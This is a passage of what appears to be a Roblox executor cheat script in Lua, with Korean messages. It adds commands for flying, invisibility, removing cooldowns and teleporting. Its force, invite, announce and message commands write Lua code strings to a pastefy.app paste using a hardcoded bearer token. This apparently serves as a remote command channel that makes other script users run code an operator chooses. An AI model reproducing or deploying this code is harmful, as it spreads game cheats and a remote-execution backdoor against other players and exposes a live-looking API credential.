				notify("Kick", v3.Name .. "님에게 강퇴 명령을 전송했습니다", 3)
			else
				notify("Error", "명령 전송에 실패했습니다", 3)
			end
		end)
	end)

	addcmd("listofuser", { "lou" }, function()
		getgenv().delvape("listofuser")

		if getgenv().openListOfUserGUI then
			getgenv().openListOfUserGUI()
		else
			notify("Error", "GUI 로직을 로딩하는 중입니다", 3)
		end
	end)

	addcmd("forcecmd", { "fcmd", "force" }, function(arg)
		if getgenv().delvape then
			getgenv().delvape("forcecmd")
			getgenv().delvape("fcmd")
			getgenv().delvape("force")
		end

		if not arg[1] or not arg[2] then
			notify("Force CMD", "사용법: ;forcecmd [플레이어] [명령어] [타겟/인자]", 3)
			return
		end
		local v2 = arg[1]
		local v3 = arg[2]
		local str2 = arg[3] or ""
		local str3 = ";force " .. v2 .. " " .. v3 .. (str2 ~= "" and " " .. str2 or "")

		pcall(function()
			local TextChatService = game:GetService("TextChatService")

			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local rbxGeneral = TextChatService.TextChannels.RBXGeneral

				if rbxGeneral then
					rbxGeneral:SendAsync(str3)
				end
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str3, "All")
			end
		end)

		task.spawn(function()
			local str4 = v3 .. (str2 ~= "" and " " .. str2 or "")

			pcall(function()
				local _httprequest = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

				if _httprequest then
					_httprequest({
						Url = "https://pastefy.app/api/v2/paste/TlJLq0iV",
						Method = "PUT",
						Headers = {
							Authorization = "Bearer VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ",
							["Content-Type"] = "application/json",
						},
						Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = v2 .. "|" .. str4 }),
					})
				end
			end)
		end)

		notify("Force CMD", "강제 명령어 전송: " .. str3, 2)
	end)

	addcmd("forceinvite", { "finvite", "forceinv" }, function(arg)
		if getgenv().delvape then
			getgenv().delvape("forceinvite")
			getgenv().delvape("finvite")
			getgenv().delvape("forceinv")
		end

		if not arg[1] then
			notify("Force Invite", "사용법: ;forceinvite [플레이어 닉네임]", 3)
			return
		end
		local v2 = string.lower(arg[1])
		local v3 = nil

		for _, player in ipairs(Players:GetPlayers()) do
			if player == lp then
				v3 = nil
			else
				local flag9 = string.lower(player.Name) == v2
				local flag10

				if flag9 then
					flag10 = flag9
				else
					flag10 = player.DisplayName and string.lower(player.DisplayName) == v2
				end

				flag10 = flag10 or string.find(string.lower(player.Name), v2, 1, true)

				if flag10 then
					v3 = player
					break
				else
					v3 = nil
				end
			end
		end

		if v3 then
			notify("Force Invite", "알림: " .. v3.Name .. " 님은 이미 같은 서버에 있습니다! (같은 서버는 타겟팅 제외)", 3)
			return
		end
		local placeId = game.PlaceId
		local jobId2 = game.JobId
		if not jobId2 or jobId2 == "" then
			notify("Force Invite", "오류: 현재 관리자 서버의 JobId를 가져올 수 없습니다.", 3)
			return
		end
		local str2 = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", placeId, jobId2)

		task.spawn(function()
			pcall(function()
				local _httprequest = httprequest or syn and syn.request
				local request_

				if _httprequest then
					request_ = _httprequest
				else
					request_ = http and http.request
				end

				local _http_request = request_ or http_request or fluxus and fluxus.request or request

				if _http_request then
					_http_request({
						Url = "https://pastefy.app/api/v2/paste/TlJLq0iV",
						Method = "PUT",
						Headers = {
							Authorization = "Bearer VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ",
							["Content-Type"] = "application/json",
						},
						Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = arg[1] .. "|" .. str2 }),
					})
				end
			end)
		end)

		local str3 = ";force " .. arg[1] .. " " .. str2

		pcall(function()
			local TextChatService = game:GetService("TextChatService")

			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatVersion then
				local rbxGeneral = TextChatService.TextChannels.RBXGeneral

				if rbxGeneral then
					rbxGeneral:SendAsync(str3)
				end
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str3, "All")
			end
		end)

		notify("Force Invite", arg[1] .. " 님을 현재 서버로 강제 소환 명령 전송 완료! 🚀", 3)
	end)

	addcmd("scriptacc", { "allacc", "acc", "announce", "notice" }, function(arg, arg2)
		if not arg[1] then
			notify("Script Acc", "사용법: ;allacc [공지내용] 또는 ;scriptacc [공지내용]", 3)
			return
		end
		local str2 = table.concat(arg, " ")
		arg2 = arg2 and arg2.Name or lp.Name
		local str3 = string.format("if getgenv().showScriptAccGUI then getgenv().showScriptAccGUI(%q, %q) end", str2, arg2)

		task.spawn(function()
			pcall(function()
				local _httprequest = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

				if _httprequest then
					_httprequest({
						Url = "https://pastefy.app/api/v2/paste/TlJLq0iV",
						Method = "PUT",
						Headers = {
							Authorization = "Bearer VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ",
							["Content-Type"] = "application/json",
						},
						Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = "all|" .. str3 }),
					})
				end
			end)
		end)

		local str4 = ";force all " .. str3

		pcall(function()
			local TextChatService = game:GetService("TextChatService")

			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatVersion then
				local rbxGeneral = TextChatService.TextChannels.RBXGeneral

				if rbxGeneral then
					rbxGeneral:SendAsync(str4)
				end
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str4, "All")
			end
		end)

		if getgenv().showScriptAccGUI then
			getgenv().showScriptAccGUI(str2, arg2)
		end

		notify("Script Acc", "모든 유저에게 공지사항 전송 완료! 📢", 3)
	end)

	addcmd("message", { "msg", "sm", "pm" }, function(arg, arg2)
		if not arg[1] or not arg[2] then
			notify("Message", "사용법: ;message [플레이어 닉네임] [할말]", 3)
			return
		end
		local v2 = arg[1]
		local tbl6 = {}

		for i = 2, #arg do
			table.insert(tbl6, arg[i])
		end

		local str2 = table.concat(tbl6, " ")
		local str3 = string.format("game:GetService(\"StarterGui\"):SetCore(\"SendNotification\", {Title = \"💬 관리자 개인 메시지 (%s)\", Text = %q, Duration = 7})", arg2 and arg2.Name or lp.Name, str2)

		task.spawn(function()
			pcall(function()
				local _httprequest = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

				if _httprequest then
					_httprequest({
						Url = "https://pastefy.app/api/v2/paste/TlJLq0iV",
						Method = "PUT",
						Headers = {
							Authorization = "Bearer VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ",
							["Content-Type"] = "application/json",
						},
						Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = v2 .. "|" .. str3 }),
					})
				end
			end)
		end)

		local str4 = ";force " .. v2 .. " " .. str3

		pcall(function()
			local TextChatService = game:GetService("TextChatService")

			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatVersion then
				local rbxGeneral = TextChatService.TextChannels.RBXGeneral

				if rbxGeneral then
					rbxGeneral:SendAsync(str4)
				end
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str4, "All")
			end
		end)

		notify("Message", v2 .. " 님에게 메시지 전송 완료! 💬", 3)
	end)

	local function fn4(arg, arg2)
		Instance.new("UICorner", arg).CornerRadius = UDim.new(0, arg2 or 8)
	end

	local function createTextLabel(arg, text3, arg2, arg3, arg4, arg5, textColor3, textSize, textXAlignment)
		local textLabel = Instance.new("TextLabel", arg)
		textLabel.Position = UDim2.new(0, arg2, 0, arg3)
		textLabel.Size = UDim2.new(0, arg4, 0, arg5)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text3
		textLabel.TextColor3 = textColor3 or Color3.fromRGB(200, 200, 200)
		textLabel.Font = Enum.Font.Gotham
		textLabel.TextSize = textSize or 12
		textLabel.TextXAlignment = textXAlignment or Enum.TextXAlignment.Left
		textLabel.TextWrapped = true
		return textLabel
	end

	local function createTextBox(arg, arg2, arg3, arg4, arg5, arg6)
		local textBox = Instance.new("TextBox", arg)
		textBox.Position = UDim2.new(0, arg3, 0, arg4)
		textBox.Size = UDim2.new(0, arg5, 0, arg6)
		textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
		textBox.TextColor3 = Color3.new(1, 1, 1)
		textBox.Text = tostring(arg2)
		textBox.Font = Enum.Font.Gotham
		textBox.TextSize = 12
		textBox.BorderSizePixel = 0
		textBox.ClearTextOnFocus = false
		textBox.TextEditable = false
		textBox.TextXAlignment = Enum.TextXAlignment.Left
		textBox.ClipsDescendants = true
		fn4(textBox, 5)
		local uiPadding = Instance.new("UIPadding", textBox)
		uiPadding.PaddingLeft = UDim.new(0, 8)
		uiPadding.PaddingRight = UDim.new(0, 8)
		return textBox
	end

	local function createTextButton(arg, text3, arg2, arg3, arg4, arg5, backgroundColor3)
		local textButton2 = Instance.new("TextButton", arg)
		textButton2.Position = UDim2.new(0, arg2, 0, arg3)
		textButton2.Size = UDim2.new(0, arg4, 0, arg5)
		textButton2.BackgroundColor3 = backgroundColor3 or Color3.fromRGB(60, 60, 75)
		textButton2.TextColor3 = Color3.new(1, 1, 1)
		textButton2.Text = text3
		textButton2.Font = Enum.Font.GothamBold
		textButton2.TextSize = 12
		textButton2.BorderSizePixel = 0
		fn4(textButton2, 6)
		return textButton2
	end

	local function testHasher3(data)
		local n7 = math.floor(data or 0)
		return string.format("%02d시간 %02d분 %02d초", math.floor(n7 / 3600), math.floor(n7 % 3600 / 60), n7 % 60)
	end

	local function getHwid5()
		local localPlayer = Players.LocalPlayer
		local _PARENT = PARENT

		if not _PARENT then
			if gethui then
				_PARENT = gethui()
			elseif COREGUI and COREGUI:FindFirstChild("RobloxGui") then
				_PARENT = COREGUI.RobloxGui
			elseif COREGUI then
				_PARENT = COREGUI
			elseif localPlayer then
				_PARENT = localPlayer:FindFirstChildOfClass("PlayerGui")
			end
		end

		if not _PARENT and localPlayer then
			_PARENT = localPlayer:WaitForChild("PlayerGui", 3)
		end

		if not _PARENT then
			return
		end
		local unknownServerInfoGUI = _PARENT:FindFirstChild("UnknownServerInfoGUI")

		if unknownServerInfoGUI then
			unknownServerInfoGUI:Destroy()
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "UnknownServerInfoGUI"
		screenGui2.ResetOnSpawn = false
		screenGui2.DisplayOrder = 999

		if syn and syn.protect_gui then
			syn.protect_gui(screenGui2)
		end

		screenGui2.Parent = _PARENT
		local flag9 = false
		local n7 = 360
		local frame2 = Instance.new("Frame", screenGui2)
		frame2.Size = UDim2.new(0, 360, 0, 210)
		frame2.Position = UDim2.new(0.5, -(n7 / 2), 0.4, -105)
		frame2.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
		frame2.BorderSizePixel = 0
		frame2.Active = true
		fn4(frame2, 10)
		local frame3 = Instance.new("Frame", frame2)
		frame3.Size = UDim2.new(1, 0, 0, 36)
		frame3.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
		frame3.BorderSizePixel = 0
		fn4(frame3, 10)
		createTextLabel(frame3, "📊 서버 정보 (Server Info)", 12, 0, n7 - 50, 36, Color3.fromRGB(100, 210, 255), 13)
		local v2 = createTextButton(frame3, "X", n7 - 31, 5, 26, 26, Color3.fromRGB(220, 50, 50))
		fn4(v2, 13)

		v2.MouseButton1Click:Connect(function()
			flag9 = true

			if getgenv().delvape then
				getgenv().delvape("serverinfo")
			end

			screenGui2:Destroy()
		end)

		local UserInputService_2 = game:GetService("UserInputService")
		local flag10 = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag10 = true
				position = input.Position
				position2 = frame2.Position
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if flag10 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local n8 = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n8.X, position2.Y.Scale, position2.Y.Offset + n8.Y)
			end
		end)

		UserInputService_2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag10 = false
			end
		end)

		local v3 = testHasher3(workspace.DistributedGameTime)
		local maxPlayers = Players.MaxPlayers
		local str2 = string.format("%d / %d 명", #Players:GetPlayers(), maxPlayers)
		local str3 = tostring(game.PlaceId)
		local jobId2 = game.JobId ~= "" and game.JobId or "Singleplayer / Local"

		local function fn5(arg, arg2, arg3, arg4)
			createTextLabel(frame2, arg2, 14, arg, 80, 28, Color3.fromRGB(180, 180, 200), 12)
			local v4 = createTextBox(frame2, arg3, 98, arg, arg4 and n7 - 164 or n7 - 108, 28)

			if arg4 then
				local v5 = createTextButton(frame2, "복사", n7 - 58, arg, 46, 28, Color3.fromRGB(0, 140, 220))

				v5.MouseButton1Click:Connect(function()
					if flag9 then
						return
					end
					local flag11

					if setclipboard then
						setclipboard(arg4)
						flag11 = true
					else
						flag11 = false

						if toclipboard then
							toclipboard(arg4)
							flag11 = true
						end
					end

					if flag11 then
						v5.Text = "완료"
						v5.BackgroundColor3 = Color3.fromRGB(40, 180, 80)

						if notify then
							notify("Server Info", arg2 .. " 복사 완료!", 2)
						end

						task.delay(1.5, function()
							if v5 and v5.Parent then
								v5.Text = "복사"
								v5.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
							end
						end)
					elseif notify then
						notify("Server Info", "클립보드 복사를 지원하지 않는 실행기입니다.", 3)
					end
				end)
			end

			return v4
		end

		local v4 = fn5(46, "서버 시간:", v3, nil)
		local v5 = fn5(84, "접속 인원:", str2, nil)
		fn5(122, "Place ID:", str3, str3)
		fn5(160, "Job ID:", jobId2, game.JobId ~= "" and game.JobId or nil)

		task.spawn(function()
			while true do
				if not flag9 and screenGui2 and screenGui2.Parent then
					task.wait(1)

					if not flag9 and screenGui2 and screenGui2.Parent then
						pcall(function()
							if v4 and v5 then
								v4.Text = testHasher3(workspace.DistributedGameTime)
								local maxPlayers2 = Players.MaxPlayers
								v5.Text = string.format("%d / %d 명", #Players:GetPlayers(), maxPlayers2)
							end
						end)

						continue
					end
				end

				break
			end
		end)
	end

	getgenv().openServerInfoGUI = getHwid5

	addcmd("serverinfo", { "sinfo", "server" }, function()
		getgenv().delvape("serverinfo")
		getHwid5()
	end)

	addcmd("rj", { "rejoin" }, function()
		notify("Rejoin", "서버로 다시 접속 중입니다...", 3)
		wait(0.5)
		game:GetService("TeleportService"):Teleport(game.PlaceId)
	end)

	addcmd("teleport", { "tp", "to", "goto" }, function(arg, arg2)
		if not arg[1] then
			notify("Error", "target을 지정해주세요")
			return
		end
		local v2 = arg[1]
		local v3, name

		if string.lower(v2) == "dummy" then
			v3 = nil
			name = nil

			for _, descendant in pairs(workspace:GetDescendants()) do
				if descendant:IsA("Model") and getRoot(descendant) and descendant:FindFirstChildWhichIsA("Humanoid") and Players:GetPlayerFromCharacter(descendant) == nil then
					v3 = getRoot(descendant)
					name = descendant.Name
					break
				else
					v3 = nil
					name = nil
				end
			end

			if not v3 then
				notify("Error", "Dummy NPC를 찾을 수 없습니다")
				return
			end
		else
			local v4 = nil

			for _, player in pairs(Players:GetPlayers()) do
				if string.lower(player.Name):find(string.lower(v2), 1, true) or string.lower(player.DisplayName):find(string.lower(v2), 1, true) then
					v4 = player
					break
				else
					v4 = nil
				end
			end

			if not v4 then
				notify("Error", "플레이어를 찾을 수 없습니다: " .. v2)
				return
			end

			if not v4.Character then
				notify("Error", "Character를 찾을 수 없습니다")
				return
			end
			v3 = getRoot(v4.Character)
			name = v4.DisplayName ~= "" and v4.DisplayName or v4.Name
		end

		local v4 = getRoot(arg2.Character)
		if not v4 or not v3 then
			notify("Error", "Character를 찾을 수 없습니다")
			return
		end
		v4.CFrame = v3.CFrame + Vector3.new(3, 0, 0)
		notify("Teleport", (name or v2) .. "에게 이동했습니다", 2)
	end)

	addcmd("reset", {}, function(arg, arg2)
		local character = arg2.Character
		if not character then
			notify("Error", "Character를 찾을 수 없습니다")
			return
		end
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if humanoid then
			humanoid.Health = 0
			notify("Reset", "HP를 0으로 설정했습니다", 2)
		end
	end)

	addcmd("re", { "respawn", "refresh" }, function(arg, arg2)
		local character = arg2.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		local cFrame2 = nil

		if humanoidRootPart then
			cFrame2 = humanoidRootPart.CFrame
		else
			cFrame2 = cFrame or cFrame2
		end

		if not cFrame2 then
			notify("Error", "위치를 저장할 수 없습니다 (이전 기록 없음)", 2)
			return
		end
		character = character and character:FindFirstChildWhichIsA("Humanoid")

		if character and character.Health > 0 then
			character.Health = 0
		end

		notify("Respawn", "리스폰중.,..", 2)

		task.spawn(function()
			local humanoidRootPart2 = arg2.CharacterAdded:Wait():WaitForChild("HumanoidRootPart", 10)

			if humanoidRootPart2 then
				task.wait(0.5)
				humanoidRootPart2.CFrame = cFrame2
			end
		end)
	end)
end

addcmd("upsidedown", { "upd" }, function(arg, arg2)
	local character = arg2.Character
	if not character then
		notify("Error", "Character를 찾을 수 없습니다")
		return
	end
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")
	if not humanoid then
		notify("Error", "Humanoid을 찾을 수 없습니다")
		return
	end
	getgenv().UpsideDownActive = true
	notify("Upside Down", "켜졌습니다 ✅", 2)
	local animation = Instance.new("Animation")
	animation.AnimationId = "rbxassetid://18236605028"
	local v = humanoid:LoadAnimation(animation)
	v.Priority = Enum.AnimationPriority.Action3
	v:Play()
	v.Looped = true
	v:AdjustSpeed(1)
	getgenv().UpsideDownTrack = v
	local v2 = getRoot(character)

	if v2 then
		local connection = nil

		connection = game:GetService("RunService").Heartbeat:Connect(function()
			if not getgenv().UpsideDownActive or not v2 or not v2.Parent then
				connection:Disconnect()

				if v then
					pcall(function()
						v:Stop()
					end)
				end

				return
			end

			pcall(function()
				v2.CFrame = v2.CFrame * CFrame.Angles(0, 0, 0.0017453292519943296)
			end)
		end)
	end
end)

addcmd("unupsidedown", { "unupd", "noupd" }, function()
	getgenv().UpsideDownActive = false

	if getgenv().UpsideDownTrack then
		pcall(function()
			getgenv().UpsideDownTrack:Stop()
		end)
	end

	notify("Upside Down", "꺼졌습니다 ❌", 2)
end)

addcmd("antiragdoll", { "antirg", "norag" }, function(arg, arg2)
	local character = arg2.Character
	if not character then
		notify("Error", "Character를 찾을 수 없습니다")
		return
	end
	getgenv().AntiRagdollActive = true
	notify("Anti Ragdoll", "켜졌습니다 ✅", 2)
	local tbl5 = { "Freeze", "AntiMove", "Slowed", "StopRunning", "ComboStun" }
	local connection = nil

	connection = game:GetService("RunService").Heartbeat:Connect(function()
		if not getgenv().AntiRagdollActive or not character or not character.Parent then
			connection:Disconnect()
			return
		end

		for _, v in pairs(tbl5) do
			local v2 = character:FindFirstChild(v)

			if v2 and v2:IsA("Accessory") then
				pcall(function()
					v2:Destroy()
				end)
			end
		end

		local humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if humanoid then
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
		end
	end)
end)

addcmd("unantiragdoll", { "unantirg", "noantirag", "norag" }, function()
	getgenv().AntiRagdollActive = false
	notify("Anti Ragdoll", "꺼졌습니다 ❌", 2)
end)

addcmd("nodashcooldown", { "nodc", "fastdash" }, function()
	getgenv().NoDashCooldownActive = true
	notify("No Dash Cooldown", "켜졌습니다 ✅", 2)

	pcall(function()
		game:GetService("Workspace"):SetAttribute("NoDashCooldown", true)
	end)
end)

addcmd("unnodashcooldown", { "unnodc", "nonodc" }, function()
	getgenv().NoDashCooldownActive = false
	notify("No Dash Cooldown", "꺼졌습니다 ❌", 2)

	pcall(function()
		game:GetService("Workspace"):SetAttribute("NoDashCooldown", false)
	end)
end)

addcmd("addvape", { "vapeadd" }, function(arg)
	if arg[1] then
		local v = arg[1]
		getgenv().addvape(v)
		getgenv().delvape("addvape")
	end
end)

addcmd("delvape", { "vapedel", "removevape", "vaperemove" }, function(arg)
	if arg[1] then
		local v = arg[1]
		getgenv().delvape(v)
		getgenv().delvape("delvape")
	end
end)

local function getHwid3()
	if getgenv().TSBInvisibility and type(getgenv().TSBInvisibility) == "table" and getgenv().TSBInvisibility.Alive then
		return getgenv().TSBInvisibility
	end
	local v = Enum.KeyCode.V
	local Players_ = game:GetService("Players")
	local RunService_2 = game:GetService("RunService")
	game:GetService("UserInputService")
	local localPlayer = Players_.LocalPlayer
	local genv = getgenv()
	local tsbInvisibility = genv.TSBInvisibility

	if type(tsbInvisibility) == "table" and type(tsbInvisibility.Unload) == "function" then
		pcall(tsbInvisibility.Unload)
	end

	local tsbInvisibility2 = {
		Alive = true,
		Enabled = false,
		Key = v,
		AnimationId = "rbxassetid://107114358965793",
		AnimationTime = 18,
		FadeTransparency = 0.5,
	}

	local tbl5 = {}
	local tbl6 = {}
	local tbl7 = {}
	local v2 = nil
	local v3 = nil
	local v4 = nil
	local animation = nil
	local v5 = nil
	local flag2 = false

	local function fn2(arg)
		for k, v6 in pairs(arg) do
			v6:Disconnect()
			arg[k] = nil
		end
	end

	local function fn3()
		if v5 then
			pcall(v5.Stop, v5, 0)
			v5:Destroy()
			v5 = nil
		end

		if animation then
			animation:Destroy()
			animation = nil
		end
	end

	local function fn4(parent)
		if v5 and v3 == parent then
			return v5
		end
		fn3()
		local animator = parent:FindFirstChildWhichIsA("Animator")

		if not animator then
			animator = Instance.new("Animator")
			animator.Parent = parent
		end

		animation = Instance.new("Animation")
		animation.AnimationId = tsbInvisibility2.AnimationId
		local ok, result = pcall(animator.LoadAnimation, animator, animation)
		if not ok or not result then
			fn3()
			return nil
		end
		result.Priority = Enum.AnimationPriority.Action4
		v5 = result
		return v5
	end

	local function fn5(arg)
		return arg.Name:lower():find("hitbox", 1, true) ~= nil
	end

	local function fn6(arg)
		if tbl7[arg] == nil then
			tbl7[arg] = arg.Transparency
		end

		return tbl7[arg]
	end

	local function fn7(arg)
		if not v4 then
			return
		end

		if arg:IsA("BasePart") then
			if arg == v4 then
				return
			end
			local v6 = fn6(arg)

			if fn5(arg) or v6 == 1 then
				arg.Transparency = 1
			else
				arg.Transparency = tsbInvisibility2.FadeTransparency
			end
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			local parent = arg.Parent
			if parent and fn5(parent) then
				return
			end

			if fn6(arg) ~= 1 then
				arg.Transparency = tsbInvisibility2.FadeTransparency
			end
		end
	end

	local function fn8(arg)
		for _, descendant in ipairs(arg:GetDescendants()) do
			fn7(descendant)
		end
	end

	local function fn9()
		for k, v6 in pairs(tbl7) do
			if not k.Parent then
				tbl7[k] = nil
			elseif k:IsA("BasePart") then
				if k ~= v4 then
					if fn5(k) or v6 == 1 then
						k.Transparency = 1
					else
						k.Transparency = tsbInvisibility2.FadeTransparency
					end
				end
			elseif k:IsA("Decal") or k:IsA("Texture") then
				local parent = k.Parent

				if (not parent or not fn5(parent)) and v6 ~= 1 then
					k.Transparency = tsbInvisibility2.FadeTransparency
				end
			end
		end
	end

	local function fn10()
		for k, v6 in pairs(tbl7) do
			if k.Parent then
				pcall(function()
					k.Transparency = v6
				end)
			end

			tbl7[k] = nil
		end
	end

	local function fn11()
		if v5 and v5.IsPlaying then
			pcall(v5.Stop, v5, 0)
		end
	end

	local function fn12(arg)
		fn2(tbl6)
		fn10()
		fn3()
		v2 = nil
		v3 = nil
		v4 = nil
		if not arg then
			return
		end
		local humanoid = arg:WaitForChild("Humanoid", 10)
		local humanoidRootPart = arg:WaitForChild("HumanoidRootPart", 10)
		if not tsbInvisibility2.Alive or localPlayer.Character ~= arg or not humanoid or not humanoidRootPart then
			return
		end
		v2 = arg
		v3 = humanoid
		v4 = humanoidRootPart

		tbl6.descendantAdded = arg.DescendantAdded:Connect(function(descendant)
			if tsbInvisibility2.Enabled then
				task.defer(fn7, descendant)
			end
		end)

		if tsbInvisibility2.Enabled then
			fn8(arg)
		end
	end

	local function fn13()
		if not tsbInvisibility2.Alive or not tsbInvisibility2.Enabled or flag2 then
			return
		end

		if not v2 or not v3 or not v4 then
			return
		end

		if v3.Health <= 0 or not v4.Parent then
			return
		end
		flag2 = true
		fn9()
		local v6 = fn4(v3)

		pcall(function()
			if v6 then
				if not v6.IsPlaying then
					v6:Play(0)
				end

				v6.TimePosition = tsbInvisibility2.AnimationTime
				v6:AdjustSpeed(0)
				v6:AdjustWeight(1, 0)
			end

			RunService_2.RenderStepped:Wait()
		end)

		fn11()
		flag2 = false
	end

	tsbInvisibility2.SetEnabled = function(arg)
		tsbInvisibility2.Enabled = arg == true

		if tsbInvisibility2.Enabled then
			if v2 then
				fn8(v2)
			end
		else
			fn11()
			fn10()
		end

		return tsbInvisibility2.Enabled
	end

	tsbInvisibility2.Toggle = function()
		return tsbInvisibility2.SetEnabled(not tsbInvisibility2.Enabled)
	end

	tsbInvisibility2.Unload = function()
		if not tsbInvisibility2.Alive then
			return
		end
		tsbInvisibility2.Alive = false
		tsbInvisibility2.Enabled = false
		fn2(tbl6)
		fn2(tbl5)
		fn11()
		fn10()
		fn3()

		if genv.TSBInvisibility == tsbInvisibility2 then
			genv.TSBInvisibility = nil
		end
	end

	tbl5.heartbeat = RunService_2.Heartbeat:Connect(fn13)

	tbl5.characterAdded = localPlayer.CharacterAdded:Connect(function(character)
		task.spawn(fn12, character)
	end)

	task.spawn(fn12, localPlayer.Character)
	genv.TSBInvisibility = tsbInvisibility2
	return tsbInvisibility2
end

addcmd("invisable", { "invis", "invisible", "tsbinvis" }, function()
	getHwid3().SetEnabled(true)
	notify("Invisibility", "Invisibility가 활성화되었습니다.", 3)
end)

addcmd("uninvisable", { "uninvis", "uninvisible", "untsbinvis" }, function()
	if getgenv().TSBInvisibility then
		getgenv().TSBInvisibility.SetEnabled(false)
	end

	notify("Invisibility", "Invisibility가 비활성화되었습니다.", 3)
end)

addcmd("fly", { "flight" }, function(arg, arg2)
	if getgenv().FlyActive then
		getgenv().FlyActive = false
		wait(0.1)
	end

	local character = arg2.Character
	if not character then
		notify("Error", "Character를 찾을 수 없습니다")
		return
	end
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")
	local v = getRoot(character)
	if not humanoid or not v then
		notify("Error", "Humanoid 또는 Root를 찾을 수 없습니다")
		return
	end
	getgenv().FlyActive = true
	notify("Flying", "켜졌습니다 ✅", 2)
	local n = tonumber(arg[1]) or 100
	local currentCamera = workspace.CurrentCamera
	local cFrame = v.CFrame
	local connection = nil

	connection = game:GetService("RunService").Heartbeat:Connect(function()
		if not getgenv().FlyActive or not character or not character.Parent then
			connection:Disconnect()

			if v and v.Parent then
				v.Velocity = Vector3.zero
				v.RotVelocity = Vector3.zero
			end

			getgenv().FlyActive = false
			return
		end

		local v2 = n
		local cFrame2 = currentCamera.CFrame
		local lookVector = cFrame2.LookVector
		local rightVector = cFrame2.RightVector
		local cframe = CFrame.new(v.Position, v.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
		local round_ = math.round
		local v3 = humanoid.MoveDirection:Dot(cframe.LookVector)
		local v4 = round_(v3)
		local round_2 = math.round
		local v5 = humanoid.MoveDirection:Dot(cframe.RightVector)
		local v6 = round_2(v5)
		local velocity

		if v4 == 1 then
			velocity = Vector3.zero + lookVector * v2
		else
			velocity = Vector3.zero

			if v4 == -1 then
				velocity = Vector3.zero - lookVector * v2
			end
		end

		if v6 == 1 then
			velocity += rightVector * v2
		elseif v6 == -1 then
			velocity -= rightVector * v2
		end

		if v4 == 0 and v6 == 0 then
			v.Velocity = Vector3.zero
			local v7 = v
			local v8 = cFrame
			local cFrame3

			if cFrame then
				cFrame3 = v8
			else
				cFrame3 = v.CFrame
			end

			v7.CFrame = cFrame3
		else
			v.Velocity = velocity
			cFrame = v.CFrame
		end

		v.RotVelocity = Vector3.zero
		v.CFrame = CFrame.new(v.Position, v.Position + lookVector)
	end)
end)

addcmd("unfly", { "unflight", "nofly" }, function(arg, arg2)
	getgenv().FlyActive = false
	local character = arg2.Character

	if character then
		local v = getRoot(character)

		if v then
			v.Velocity = Vector3.zero
			v.RotVelocity = Vector3.zero
		end
	end

	notify("Flying", "꺼졌습니다 ❌", 2)
end)

addcmd("emotedash", { "edash" }, function(arg, arg2)
	local character = arg2.Character
	if not character then
		notify("Error", "Character를 찾을 수 없습니다")
		return
	end
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")
	if not humanoid then
		notify("Error", "Humanoid을 찾을 수 없습니다")
		return
	end
	getgenv().EmoteDashActive = true
	notify("Emote Dash", "켜졌습니다 ✅", 2)
	local tbl5 = { "rbxassetid://10480796021", "rbxassetid://10480793962", "rbxassetid://10491993682" }
	local connection = nil

	connection = game:GetService("RunService").Heartbeat:Connect(function()
		if not getgenv().EmoteDashActive or not character or not character.Parent then
			connection:Disconnect()
			return
		end

		for _, v in pairs(humanoid:GetPlayingAnimationTracks()) do
			if table.find(tbl5, v.Animation.AnimationId) then
				v:AdjustSpeed(99)
			end
		end

		local v = getRoot(character)

		if v and v.Velocity.Magnitude > 50 and not getgenv().EmoteDashPlaying then
			getgenv().EmoteDashPlaying = true

			task.spawn(function()
				local animation = Instance.new("Animation")
				animation.AnimationId = "rbxassetid://507771019"
				local v2 = humanoid:LoadAnimation(animation)
				v2:Play()
				v2:AdjustSpeed(5)
				task.wait(0.3)
				v2:Stop()
				getgenv().EmoteDashPlaying = false
